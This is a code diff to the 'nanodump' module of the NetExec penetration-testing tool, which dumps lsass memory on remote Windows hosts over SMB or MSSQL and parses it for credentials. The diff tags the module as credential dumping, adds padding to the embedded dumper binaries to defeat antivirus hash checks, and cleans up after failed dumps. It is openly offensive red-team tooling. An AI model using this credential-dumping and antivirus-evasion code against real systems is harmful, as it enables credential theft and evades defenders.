@@ -9,6 +9,7 @@ from pypykatz.pypykatz import pypykatz
 import tempfile
 from datetime import datetime
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.misc import CATEGORY
 from nxc.protocols.mssql.mssqlexec import MSSQLEXEC
 
 
@@ -16,8 +17,7 @@ class NXCModule:
     name = "nanodump"
     description = "Get lsass dump using nanodump and parse the result with pypykatz"
     supported_protocols = ["smb", "mssql"]
-    opsec_safe = False
-    multiple_hosts = True
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
         self.connection = None
@@ -51,6 +51,10 @@ class NXCModule:
         self.nano = "nano.exe"
         self.nano_path = ""
         self.useembeded = True
+        # Add some random binary data to defeat AVs which check the file hash
+        padding = datetime.now().strftime("%Y%m%d%H%M%S").encode()
+        self.nano_embedded64 += padding
+        self.nano_embedded32 += padding
 
         if "NANO_PATH" in module_options:
             self.nano_path = module_options["NANO_PATH"]
@@ -149,7 +153,10 @@ class NXCModule:
             self.context.log.fail("Process lsass.exe error on dump, try with verbose")
             dump = False
 
-        if dump:
+        if not dump:
+            self.delete_nanodump_binary()
+            return
+        else:
             self.context.log.display(f"Copying {nano_log_name} to host")
             filename = os.path.join(self.dir_result, f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
             if self.context.protocol == "smb":
